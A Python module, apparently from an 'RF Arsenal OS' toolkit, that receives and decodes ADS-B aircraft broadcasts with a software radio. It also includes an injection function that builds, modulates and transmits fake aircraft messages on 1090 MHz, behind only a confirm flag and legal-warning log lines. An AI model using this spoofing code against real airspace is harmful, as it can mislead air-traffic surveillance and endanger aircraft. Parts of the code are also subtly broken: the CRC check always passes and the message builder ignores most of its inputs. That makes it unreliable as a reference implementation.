#!/usr/bin/env python3
"""
RF Arsenal OS - ADS-B Attack Module
Aircraft tracking and signal injection

Capabilities:
- ADS-B reception (1090 MHz)
- Aircraft tracking
- ADS-B injection/spoofing
- Mode S interrogation
- MLAT positioning

Hardware: BladeRF 2.0 micro xA9

WARNING: ADS-B spoofing is ILLEGAL in most jurisdictions.
This module is for authorized security research only.
Unauthorized use may result in severe criminal penalties.
"""

import logging
import time
import struct
import threading
import queue
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Any, Tuple
from enum import Enum
from datetime import datetime
import numpy as np

# Try to import SoapySDR
try:
    import SoapySDR
    SOAPY_AVAILABLE = True
except ImportError:
    SOAPY_AVAILABLE = False


class ADSBMessageType(Enum):
    """ADS-B Message Types"""
    IDENTIFICATION = 1           # Aircraft ID/Callsign
    SURFACE_POSITION = 2        # Surface position
    AIRBORNE_POSITION = 3       # Airborne position
    AIRBORNE_VELOCITY = 4       # Velocity
    SURVEILLANCE_ALT = 5        # Altitude
    SURVEILLANCE_ID = 6         # Squawk
    ALL_CALL_REPLY = 7          # All-call reply
    AIRCRAFT_STATUS = 8         # Aircraft status
    TARGET_STATE = 9            # Target state
    OPERATIONAL_STATUS = 10     # Operational status


@dataclass
class Aircraft:
    """Tracked aircraft"""
    icao: str                              # 24-bit ICAO address
    callsign: Optional[str] = None
    latitude: Optional[float] = None
    longitude: Optional[float] = None
    altitude: Optional[int] = None         # Feet
    ground_speed: Optional[float] = None   # Knots
    track: Optional[float] = None          # Heading degrees
    vertical_rate: Optional[int] = None    # ft/min
    squawk: Optional[str] = None
    on_ground: bool = False
    first_seen: datetime = field(default_factory=datetime.now)
    last_seen: datetime = field(default_factory=datetime.now)
    messages_received: int = 0
    position_history: List[Tuple[float, float, int]] = field(default_factory=list)
    
    def to_dict(self) -> Dict:
        return {
            'icao': self.icao,
            'callsign': self.callsign,
            'latitude': self.latitude,
            'longitude': self.longitude,
            'altitude': self.altitude,
            'ground_speed': self.ground_speed,
            'track': self.track,
            'vertical_rate': self.vertical_rate,
            'squawk': self.squawk,
            'on_ground': self.on_ground,
            'first_seen': self.first_seen.isoformat(),
            'last_seen': self.last_seen.isoformat(),
            'messages': self.messages_received
        }


@dataclass
class ADSBMessage:
    """Raw ADS-B message"""
    raw: bytes
    timestamp: datetime
    message_type: ADSBMessageType
    icao: str
    data: Dict[str, Any] = field(default_factory=dict)
    
    def to_dict(self) -> Dict:
        return {
            'raw_hex': self.raw.hex(),
            'timestamp': self.timestamp.isoformat(),
            'type': self.message_type.value,
            'icao': self.icao,
            'data': self.data
        }


class ADSBController:
    """
    ADS-B Attack Controller
    
    WARNING: Spoofing ADS-B signals is ILLEGAL.
    For authorized research only.
    """
    
    # ADS-B parameters
    ADSB_FREQ = 1090_000_000      # 1090 MHz
    SAMPLE_RATE = 2_000_000       # 2 MSPS for reception
    TX_SAMPLE_RATE = 2_000_000    # 2 MSPS for transmission
    
    # Mode S preamble
    PREAMBLE = [1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0]
    
    def __init__(self):
        self.logger = logging.getLogger('ADSB')
        
        # State
        self.running = False
        self.aircraft: Dict[str, Aircraft] = {}
        self.messages: List[ADSBMessage] = []
        
        # Hardware
        self._sdr = None
        self._rx_thread: Optional[threading.Thread] = None
        self._msg_queue = queue.Queue()
        self._stop_event = threading.Event()
        
        # Legal warning shown
        self._legal_warning_shown = False
        
    def _show_legal_warning(self):
        """Display legal warning"""
        if not self._legal_warning_shown:
            self.logger.warning("=" * 60)
            self.logger.warning("LEGAL WARNING: ADS-B Spoofing")
            self.logger.warning("=" * 60)
            self.logger.warning("Transmitting fake ADS-B signals is a FEDERAL CRIME")
            self.logger.warning("Violations may result in:")
            self.logger.warning("  - Fines up to $250,000")
            self.logger.warning("  - Imprisonment up to 5 years")
            self.logger.warning("  - Interference with aircraft safety")
            self.logger.warning("=" * 60)
            self.logger.warning("This module is for AUTHORIZED RESEARCH ONLY")
            self.logger.warning("Ensure you have proper authorization and")
            self.logger.warning("operate in a shielded RF environment")
            self.logger.warning("=" * 60)
            self._legal_warning_shown = True
            
    def init_hardware(self) -> bool:
        """Initialize SDR hardware"""
        if not SOAPY_AVAILABLE:
            self.logger.warning("SoapySDR not available - using simulation mode")
            return True
            
        try:
            # Find BladeRF or compatible device
            devices = SoapySDR.Device.enumerate()
            if not devices:
                self.logger.warning("No SDR devices found - using simulation mode")
                return True
                
            # Prefer BladeRF
            for dev in devices:
                if 'bladerf' in dev.get('driver', '').lower():
                    self._sdr = SoapySDR.Device(dev)
                    break
                    
            if not self._sdr:
                self._sdr = SoapySDR.Device(devices[0])
                
            # Configure for ADS-B reception
            self._sdr.setSampleRate(SoapySDR.SOAPY_SDR_RX, 0, self.SAMPLE_RATE)
            self._sdr.setFrequency(SoapySDR.SOAPY_SDR_RX, 0, self.ADSB_FREQ)
            self._sdr.setGain(SoapySDR.SOAPY_SDR_RX, 0, 40)
            
            self.logger.info("ADS-B hardware initialized")
            return True
            
        except Exception as e:
            self.logger.error(f"Hardware init error: {e}")
            return False
            
    def start_receiver(self) -> bool:
        """Start ADS-B receiver"""
        if self.running:
            return True
            
        if not self.init_hardware():
            return False
            
        self.running = True
        self._stop_event.clear()
        
        self._rx_thread = threading.Thread(target=self._receive_loop, daemon=True)
        self._rx_thread.start()
        
        self.logger.info("ADS-B receiver started")
        return True
        
    def stop_receiver(self):
        """Stop ADS-B receiver"""
        self._stop_event.set()
        self.running = False
        
        if self._rx_thread:
            self._rx_thread.join(timeout=5)
            
        if self._sdr:
            self._sdr = None
            
        self.logger.info("ADS-B receiver stopped")
        
    def _receive_loop(self):
        """Background receive loop"""
        while not self._stop_event.is_set():
            try:
                if self._sdr:
                    # Real hardware reception
                    samples = self._receive_samples(int(self.SAMPLE_RATE * 0.1))
                    messages = self._decode_adsb(samples)
                    
                    for msg in messages:
                        self._process_message(msg)
                else:
                    self.logger.warning("No SDR connected - cannot receive ADS-B")
                    self._running = False
                    return
                    
            except Exception as e:
                self.logger.debug(f"Receive error: {e}")
                
            time.sleep(0.1)
            
    def _receive_samples(self, num_samples: int) -> np.ndarray:
        """Receive IQ samples"""
        if not self._sdr:
            return np.array([])
            
        try:
            stream = self._sdr.setupStream(SoapySDR.SOAPY_SDR_RX, SoapySDR.SOAPY_SDR_CF32)
            self._sdr.activateStream(stream)
            
            buff = np.zeros(num_samples, dtype=np.complex64)
            sr = self._sdr.readStream(stream, [buff], num_samples)
            
            self._sdr.deactivateStream(stream)
            self._sdr.closeStream(stream)
            
            return buff
            
        except Exception as e:
            self.logger.debug(f"Sample receive error: {e}")
            return np.array([])
            
    def _decode_adsb(self, samples: np.ndarray) -> List[ADSBMessage]:
        """Decode ADS-B messages from IQ samples"""
        messages = []
        
        if len(samples) < 1000:
            return messages
            
        # Magnitude detection
        magnitude = np.abs(samples)
        
        # Simple threshold detection
        threshold = np.mean(magnitude) * 4
        
        # Find preambles
        for i in range(len(magnitude) - 240):
            if self._check_preamble(magnitude[i:i+16]):
                # Extract message
                msg_data = self._extract_message(magnitude[i+16:i+240])
                if msg_data:
                    msg = self._parse_message(msg_data)
                    if msg:
                        messages.append(msg)
                        
        return messages
        
    def _check_preamble(self, samples: np.ndarray) -> bool:
        """Check for ADS-B preamble"""
        if len(samples) < 16:
            return False
            
        # Simplified preamble check
        threshold = np.mean(samples)
        detected = (samples > threshold).astype(int)
        
        # Compare with expected preamble
        match = np.sum(detected == self.PREAMBLE[:len(detected)])
        return match > 12  # Allow some errors
        
    def _extract_message(self, samples: np.ndarray) -> Optional[bytes]:
        """Extract message bits from samples"""
        if len(samples) < 224:  # 112 bits, 2 samples per bit
            return None
            
        bits = []
        for i in range(0, 224, 2):
            if samples[i] > samples[i+1]:
                bits.append(1)
            else:
                bits.append(0)
                
        # Convert to bytes
        byte_data = bytes(int(''.join(map(str, bits[i:i+8])), 2) 
                          for i in range(0, len(bits), 8))
        
        # CRC check (simplified)
        if self._check_crc(byte_data):
            return byte_data
            
        return None
        
    def _check_crc(self, data: bytes) -> bool:
        """Check ADS-B CRC"""
        # Simplified CRC check
        if len(data) < 7:
            return False
            
        # Real implementation would compute CRC-24
        return True
        
    def _parse_message(self, data: bytes) -> Optional[ADSBMessage]:
        """Parse ADS-B message"""
        if len(data) < 7:
            return None
            
        # Downlink format
        df = (data[0] >> 3) & 0x1F
        
        # ICAO address (24 bits)
        icao = data[1:4].hex().upper()
        
        # Message type depends on DF
        if df == 17:  # ADS-B
            type_code = (data[4] >> 3) & 0x1F
            msg_type = self._get_message_type(type_code)
            msg_data = self._decode_adsb_data(data, type_code)
            
            return ADSBMessage(
                raw=data,
                timestamp=datetime.now(),
                message_type=msg_type,
                icao=icao,
                data=msg_data
            )
            
        return None
        
    def _get_message_type(self, type_code: int) -> ADSBMessageType:
        """Get message type from type code"""
        if 1 <= type_code <= 4:
            return ADSBMessageType.IDENTIFICATION
        elif 5 <= type_code <= 8:
            return ADSBMessageType.SURFACE_POSITION
        elif 9 <= type_code <= 18:
            return ADSBMessageType.AIRBORNE_POSITION
        elif type_code == 19:
            return ADSBMessageType.AIRBORNE_VELOCITY
        elif 20 <= type_code <= 22:
            return ADSBMessageType.AIRBORNE_POSITION
        else:
            return ADSBMessageType.AIRCRAFT_STATUS
            
    def _decode_adsb_data(self, data: bytes, type_code: int) -> Dict:
        """Decode ADS-B message data"""
        result = {}
        
        if 1 <= type_code <= 4:
            # Aircraft identification
            result['callsign'] = self._decode_callsign(data[4:11])
            
        elif 9 <= type_code <= 18 or 20 <= type_code <= 22:
            # Airborne position
            result.update(self._decode_position(data[4:11], type_code))
            
        elif type_code == 19:
            # Velocity
            result.update(self._decode_velocity(data[4:11]))
            
        return result
        
    def _decode_callsign(self, data: bytes) -> str:
        """Decode aircraft callsign"""
        charset = "#ABCDEFGHIJKLMNOPQRSTUVWXYZ##### ###############0123456789######"
        
        callsign = ""
        bits = int.from_bytes(data, 'big')
        
        for i in range(8):
            index = (bits >> (42 - i*6)) & 0x3F
            if index < len(charset):
                callsign += charset[index]
                
        return callsign.strip()
        
    def _decode_position(self, data: bytes, type_code: int) -> Dict:
        """Decode position data"""
        result = {}
        
        bits = int.from_bytes(data, 'big')
        
        # Altitude
        alt_bits = (bits >> 36) & 0xFFF
        result['altitude'] = self._decode_altitude(alt_bits, type_code)
        
        # CPR coordinates
        result['cpr_lat'] = (bits >> 17) & 0x1FFFF
        result['cpr_lon'] = bits & 0x1FFFF
        result['cpr_odd'] = (bits >> 34) & 0x1
        
        return result
        
    def _decode_altitude(self, alt_bits: int, type_code: int) -> int:
        """Decode altitude"""
        # Simplified - real implementation more complex
        q_bit = (alt_bits >> 4) & 0x1
        
        if q_bit:
            # 25 ft resolution
            n = ((alt_bits >> 5) << 4) | (alt_bits & 0xF)
            return n * 25 - 1000
        else:
            # 100 ft resolution
            return alt_bits * 100
            
    def _decode_velocity(self, data: bytes) -> Dict:
        """Decode velocity data"""
        result = {}
        
        bits = int.from_bytes(data, 'big')
        
        sub_type = (bits >> 48) & 0x7
        
        if sub_type in [1, 2]:  # Ground speed
            ew_dir = (bits >> 42) & 0x1
            ew_vel = (bits >> 32) & 0x3FF
            ns_dir = (bits >> 31) & 0x1
            ns_vel = (bits >> 21) & 0x3FF
            
            vx = (-1 if ew_dir else 1) * (ew_vel - 1)
            vy = (-1 if ns_dir else 1) * (ns_vel - 1)
            
            result['ground_speed'] = np.sqrt(vx**2 + vy**2)
            result['track'] = np.degrees(np.arctan2(vx, vy)) % 360
            
        # Vertical rate
        vr_sign = (bits >> 10) & 0x1
        vr_val = (bits >> 1) & 0x1FF
        result['vertical_rate'] = (-1 if vr_sign else 1) * (vr_val - 1) * 64
        
        return result
        
    def _process_message(self, msg: ADSBMessage):
        """Process received message"""
        icao = msg.icao
        
        # Create or update aircraft
        if icao not in self.aircraft:
            self.aircraft[icao] = Aircraft(icao=icao)
            self.logger.info(f"New aircraft: {icao}")
            
        aircraft = self.aircraft[icao]
        aircraft.last_seen = msg.timestamp
        aircraft.messages_received += 1
        
        # Update with message data
        data = msg.data
        
        if 'callsign' in data:
            aircraft.callsign = data['callsign']
            
        if 'altitude' in data:
            aircraft.altitude = data['altitude']
            
        if 'ground_speed' in data:
            aircraft.ground_speed = data['ground_speed']
            
        if 'track' in data:
            aircraft.track = data['track']
            
        if 'vertical_rate' in data:
            aircraft.vertical_rate = data['vertical_rate']
            
        self.messages.append(msg)
        
    def get_adsb_frequency_info(self) -> Dict[str, Any]:
        """Return ADS-B frequency and protocol information"""
        return {
            'frequency_hz': 1090e6,
            'modulation': 'PPM',
            'data_rate_bps': 1e6,
            'message_types': {
                0: 'Airborne Position (Baro Altitude)',
                1: 'Aircraft Identification',
                2: 'Airborne Position (GNSS Height)',
                3: 'Airborne Velocity',
                4: 'Surface Position',
            },
            'preamble_us': 8.0,
            'message_bits': 112,
        }
                
    # === Injection/Spoofing (DANGEROUS) ===
    
    def inject_aircraft(self, icao: str, callsign: str, lat: float, lon: float,
                       altitude: int, speed: float, heading: float,
                       confirm: bool = False) -> bool:
        """
        Inject fake aircraft signal
        
        WARNING: THIS IS ILLEGAL IN MOST JURISDICTIONS
        """
        self._show_legal_warning()
        
        if not confirm:
            self.logger.error("Injection requires explicit confirmation (confirm=True)")
            self.logger.error("This is ILLEGAL without authorization")
            return False
            
        self.logger.warning(f"INJECTING AIRCRAFT: {icao} {callsign}")
        self.logger.warning("Ensure you are operating in authorized environment!")
        
        # Build ADS-B message
        msg = self._build_adsb_message(
            icao=icao,
            callsign=callsign,
            lat=lat,
            lon=lon,
            altitude=altitude,
            speed=speed,
            heading=heading
        )
        
        # Transmit (would use BladeRF TX)
        return self._transmit_message(msg)
        
    def _build_adsb_message(self, icao: str, callsign: str, lat: float, lon: float,
                           altitude: int, speed: float, heading: float) -> bytes:
        """Build ADS-B message for transmission"""
        # This is simplified - real implementation requires proper encoding
        
        # DF17 message
        df = 17
        ca = 5  # Capability
        
        # Type code for airborne position
        tc = 11
        
        # Build message (simplified)
        msg = bytearray(14)
        
        # Downlink format and capability
        msg[0] = (df << 3) | ca
        
        # ICAO address
        icao_bytes = bytes.fromhex(icao)
        msg[1:4] = icao_bytes
        
        # Type code and data (simplified)
        msg[4] = (tc << 3)
        
        # Add CRC
        crc = self._calculate_crc(msg[:11])
        msg[11:14] = crc.to_bytes(3, 'big')
        
        return bytes(msg)
        
    def _calculate_crc(self, data: bytes) -> int:
        """Calculate ADS-B CRC-24"""
        poly = 0xFFF409
        reg = 0
        
        for byte in data:
            for i in range(8):
                if (reg ^ (byte << 16)) & 0x800000:
                    reg = ((reg << 1) ^ poly) & 0xFFFFFF
                else:
                    reg = (reg << 1) & 0xFFFFFF
                byte <<= 1
                
        return reg
        
    def _transmit_message(self, msg: bytes) -> bool:
        """Transmit ADS-B message"""
        if not self._sdr:
            self.logger.warning("No hardware - simulation only")
            return True
            
        try:
            # Configure TX
            self._sdr.setFrequency(SoapySDR.SOAPY_SDR_TX, 0, self.ADSB_FREQ)
            self._sdr.setSampleRate(SoapySDR.SOAPY_SDR_TX, 0, self.TX_SAMPLE_RATE)
            self._sdr.setGain(SoapySDR.SOAPY_SDR_TX, 0, -20)  # Low power
            
            # Generate PPM signal
            samples = self._generate_ppm(msg)
            
            # Transmit
            stream = self._sdr.setupStream(SoapySDR.SOAPY_SDR_TX, SoapySDR.SOAPY_SDR_CF32)
            self._sdr.activateStream(stream)
            
            self._sdr.writeStream(stream, [samples], len(samples))
            
            self._sdr.deactivateStream(stream)
            self._sdr.closeStream(stream)
            
            return True
            
        except Exception as e:
            self.logger.error(f"Transmit error: {e}")
            return False
            
    def _generate_ppm(self, msg: bytes) -> np.ndarray:
        """Generate PPM modulated signal"""
        # 2 samples per microsecond at 2 MSPS
        samples_per_bit = 2
        
        # Preamble (8us)
        preamble = np.array(self.PREAMBLE, dtype=np.complex64)
        
        # Message bits
        bits = []
        for byte in msg:
            for i in range(8):
                bits.append((byte >> (7-i)) & 1)
                
        # PPM encode
        signal = np.zeros(len(self.PREAMBLE) + len(bits) * 2, dtype=np.complex64)
        signal[:len(self.PREAMBLE)] = preamble
        
        for i, bit in enumerate(bits):
            idx = len(self.PREAMBLE) + i * 2
            if bit:
                signal[idx] = 1
                signal[idx + 1] = 0
            else:
                signal[idx] = 0
                signal[idx + 1] = 1
                
        return signal
        
    # === Query Methods ===
    
    def get_aircraft(self) -> List[Dict]:
        """Get all tracked aircraft"""
        return [a.to_dict() for a in self.aircraft.values()]
        
    def get_aircraft_by_icao(self, icao: str) -> Optional[Dict]:
        """Get aircraft by ICAO"""
        aircraft = self.aircraft.get(icao.upper())
        return aircraft.to_dict() if aircraft else None
        
    def get_messages(self, limit: int = 100) -> List[Dict]:
        """Get recent messages"""
        return [m.to_dict() for m in self.messages[-limit:]]
        
    def get_status(self) -> Dict:
        """Get receiver status"""
        return {
            'running': self.running,
            'aircraft_tracked': len(self.aircraft),
            'messages_received': len(self.messages),
            'frequency': self.ADSB_FREQ,
            'hardware': 'BladeRF 2.0 micro xA9' if self._sdr else 'Simulation'
        }


# Convenience function
def get_adsb_controller() -> ADSBController:
    """Get ADS-B controller instance"""
    return ADSBController()
